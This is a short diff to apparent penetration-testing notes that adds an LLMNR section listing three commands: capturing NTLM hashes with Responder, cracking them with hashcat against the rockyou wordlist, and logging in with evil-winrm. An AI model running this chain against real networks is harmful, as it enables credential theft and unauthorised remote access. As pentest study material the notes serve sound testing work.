@@ -272,6 +272,11 @@ https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py
 https://habr.com/ru/companies/deiteriylab/articles/581758/
 ```
 
+**LLMNR**
+1. sudo responder -I eth0
+2. hashcat -a 0 -w 4 -m 5600 tickets.txt /usr/share/wordlists/rockyou.txt
+3. evil-winrm -i [ip] -u [username] -p [password]
+
 **FTP**
 
 ```
